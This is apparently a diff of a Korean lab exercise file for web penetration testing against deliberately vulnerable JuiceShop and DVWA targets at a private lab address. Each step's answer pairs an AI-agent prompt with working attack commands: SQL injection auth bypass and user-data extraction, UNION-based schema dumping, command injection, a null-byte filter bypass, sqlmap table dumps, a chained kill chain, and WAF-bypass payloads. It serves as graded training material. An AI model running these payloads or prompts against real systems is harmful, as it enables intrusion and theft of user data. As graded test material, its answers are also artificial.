@@ -18,7 +18,10 @@ steps:
   hint: nmap -sV -p 22,80,443,3000,3306,5432,6379,8080 10.20.30.80 으로 주요 포트를 스캔하세요.
   category: recon
   points: 8
-  answer: nmap -sV -p 22,80,443,3000,3306,5432,6379,8080,8443,9200 10.20.30.80 2>/dev/null
+  answer: '🤖 프롬프트: nmap으로 대상 서버(10.20.30.80)의 열린 포트와 서비스 버전을 스캔해줘
+
+    📎 참고 (CLI): nmap -sV -p 22,80,443,3000,3306,5432,6379,8080,8443,9200 10.20.30.80
+    2>/dev/null'
   answer_detail: 침투 테스트의 첫 단계는 대상의 공격 표면을 파악하는 것입니다. nmap -sV로 서비스 버전을 식별하면 CVE 데이터베이스에서
     알려진 취약점을 검색할 수 있습니다. 80(Apache+ModSecurity), 3000(JuiceShop), 8080(DVWA)이 주요 대상입니다.
   verify:
@@ -35,12 +38,14 @@ steps:
   hint: 각 포트에 curl -sI로 응답 헤더를 확인하고, HTML 소스에서 프레임워크 단서를 찾으세요.
   category: recon
   points: 8
-  answer: echo '=== Fingerprinting ===' && echo '[Port 80]'; curl -sI http://10.20.30.80:80
-    | grep -iE '(server|x-powered|x-frame)'; echo '[Port 3000 - JuiceShop]'; curl
-    -sI http://10.20.30.80:3000 | grep -iE '(server|x-powered)'; curl -s http://10.20.30.80:3000
-    | grep -oiE '(angular|express|node|jquery)' | sort -u; echo '[Port 8080 - DVWA]';
-    curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)'; echo '=== Fingerprint
-    Complete ==='
+  answer: '🤖 프롬프트: 웹 애플리케이션 지문 수집(Fingerprinting)을 수행해줘
+
+    📎 참고 (CLI): echo ''=== Fingerprinting ==='' && echo ''[Port 80]''; curl -sI http://10.20.30.80:80
+    | grep -iE ''(server|x-powered|x-frame)''; echo ''[Port 3000 - JuiceShop]''; curl
+    -sI http://10.20.30.80:3000 | grep -iE ''(server|x-powered)''; curl -s http://10.20.30.80:3000
+    | grep -oiE ''(angular|express|node|jquery)'' | sort -u; echo ''[Port 8080 - DVWA]'';
+    curl -sI http://10.20.30.80:8080 | grep -iE ''(server|x-powered)''; echo ''===
+    Fingerprint Complete ==='''
   answer_detail: 지문 수집은 대상의 기술 스택을 파악하여 적절한 공격 벡터를 선택하는 데 중요합니다. JuiceShop은 Node.js/Express/Angular,
     DVWA는 PHP/Apache 기반입니다. 각 기술별로 특화된 공격 기법이 다릅니다.
   verify:
@@ -62,9 +67,13 @@ steps:
   hint: admin@juice-sh.op'-- 로 로그인한 후, /api/Users/ 엔드포인트에서 사용자 데이터를 추출하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login
-    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))"
+  answer: '🤖 프롬프트: JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감
+    정보를 탈취해줘
+
+    📎 참고 (CLI): echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST
+    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' | python3 -c "import
+    sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))"
     2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User
     Data Exfil ==='' && curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization:
     Bearer $TOKEN" | python3 -c "import sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  )
@@ -92,7 +101,8 @@ steps:
   hint: security=low에서 ip 파라미터에 세미콜론으로 ifconfig, ps aux 등을 연결하세요.
   category: exploit
   points: 12
-  answer: "curl -s -c /tmp/dvwa_final.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+  answer: "\U0001F916 프롬프트: DVWA에서 Command Injection으로 서버 내부 정보를 수집해줘\n\U0001F4CE\
+    \ 참고 (CLI): curl -s -c /tmp/dvwa_final.txt \\\n  -d 'username=admin&password=password&Login=Login'\
     \ http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Network Info ==='\
     \ && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1;\
     \ ip addr show \\\n | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
@@ -125,10 +135,12 @@ steps:
     테이블에서 스키마를 조회합니다.
   category: exploit
   points: 12
-  answer: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--'
-    | python3 -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]"
-    2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
-    | head -c 500
+  answer: '🤖 프롬프트: JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출해줘
+
+    📎 참고 (CLI): echo ''=== DB Schema Extraction ==='' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--''
+    | python3 -c "import sys,json; [print(d.get(''name'','''')[:80]) for d in json.load(sys.stdin).get(''data'',[])]"
+    2>/dev/null | head -15 || curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--''
+    | head -c 500'
   answer_detail: UNION SELECT로 sqlite_master 테이블을 조회하면 전체 데이터베이스의 테이블 구조(CREATE TABLE
     문)를 확인할 수 있습니다. Users, Cards, Wallets 등의 테이블 구조를 파악한 후 민감 데이터를 선택적으로 추출합니다.
   verify:
@@ -147,7 +159,10 @@ steps:
   hint: /ftp 디렉터리의 파일 목록을 확인한 후, %2500(URL 인코딩된 Null Byte)으로 확장자 필터를 우회하세요.
   category: exploit
   points: 10
-  answer: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/
+  answer: '🤖 프롬프트: JuiceShop의 /ftp 디렉터리에서 Null Byte Injection으로 접근 제한을 우회하여 민감 파일을
+    다운로드해줘
+
+    📎 참고 (CLI): echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/
     | grep -oP ''href="[^"]+"'' | head -10 && echo ''=== Null Byte Bypass ==='' &&
     echo -n ''package.json.bak%2500.md: '' && curl -s -o /dev/null -w ''HTTP:%{http_code}
     (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md''
@@ -177,11 +192,13 @@ steps:
   hint: sqlmap -u 'URL' --cookie='...' --batch --dump -T users 형태로 실행하세요.
   category: exploit
   points: 12
-  answer: SESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login'
-    http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk '{print $NF}') &&
-    echo '=== sqlmap Automated SQLi ===' && sqlmap -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
+  answer: '🤖 프롬프트: sqlmap을 사용하여 DVWA의 SQL Injection을 자동화하시오. users 테이블의 데이터를 추출해줘
+
+    📎 참고 (CLI): SESSID=$(curl -s -c - -d ''username=admin&password=password&Login=Login''
+    http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk ''{print $NF}'') &&
+    echo ''=== sqlmap Automated SQLi ==='' && sqlmap -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
     --cookie="PHPSESSID=$SESSID;security=low" --batch --dump -T users --threads=4
-    2>/dev/null | tail -20
+    2>/dev/null | tail -20'
   answer_detail: sqlmap은 SQL Injection 자동화 도구로, 취약점 탐지부터 데이터 추출까지 수행합니다. --batch는
     모든 질문에 기본값 응답, --dump는 테이블 데이터 추출, -T는 특정 테이블 지정입니다.
   verify:
@@ -203,9 +220,12 @@ steps:
     정보 수집, 순차적으로 수행하세요.
   category: exploit
   points: 12
-  answer: 'echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi Auth
-    Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
+  answer: '🤖 프롬프트: 취약점 체인을 구성하시오. SQLi(인증 우회) + BOLA(타 사용자 데이터) + Command Injection(서버
+    장악)을 연결하는 3단계 킬체인을 실행해줘
+
+    📎 참고 (CLI): echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi
+    Auth Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login
+    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
     | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "  Token: ${TOKEN:0:20}...";
     echo ''[Phase 2] BOLA - Other User Data'' && curl -s http://10.20.30.80:3000/rest/basket/2
     -H "Authorization: Bearer $TOKEN" | head -c 150; echo ''''; echo ''[Phase 3] Command
@@ -237,7 +257,9 @@ steps:
   hint: 이중 인코딩, 대소문자 혼합, HTTP 메서드 변조, Content-Type 변경 등을 조합하여 테스트하세요.
   category: exploit
   points: 10
-  answer: 'echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi]
+  answer: '🤖 프롬프트: WAF(ModSecurity)를 우회하여 포트 80을 통한 공격이 가능한지 검증해줘
+
+    📎 참고 (CLI): echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi]
     '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' "http://10.20.30.80:80/?id=1''+OR+1=1--"
     && echo '''' && echo -n ''[Double Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
     ''http://10.20.30.80:80/?id=1%2527+OR+1%253D1--'' && echo '''' && echo -n ''[JSON
@@ -268,7 +290,8 @@ steps:
   hint: 각 취약점에 CVSS 기준 위험도를 부여하고, 재현 방법과 조치 방안을 구체적으로 기술하세요.
   category: reporting
   points: 12
-  answer: "cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n\
+  answer: "\U0001F916 프롬프트: 전체 침투 테스트 결과를 요약하는 보안 진단 보고서를 구현 방법을 설명하고 예시 코드를 보여줘\n\
+    \U0001F4CE 참고 (CLI): cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n\
     \  웹 애플리케이션 침투 테스트 보고서\n  대상: 10.20.30.80 (JuiceShop + DVWA + Apache)\n  수행일:\
     \ 2026-04-06\n====================================================\n\n[1. 정보수집]\n\
     - 오픈 포트: 80(Apache+ModSecurity), 3000(JuiceShop/Node.js), 8080(DVWA/PHP)\n- 기술스택:\
@@ -342,7 +365,17 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) nmap으로 대상 서버(10.20.30.80)의 열린 포트와 서비스 버전을 스캔해줘
+
+    2) 웹 애플리케이션 지문 수집(Fingerprinting)을 수행해줘
+
+    3) JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감 정보를 탈취해줘
+
+    4) DVWA에서 Command Injection으로 서버 내부 정보를 수집해줘
+
+    5) JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
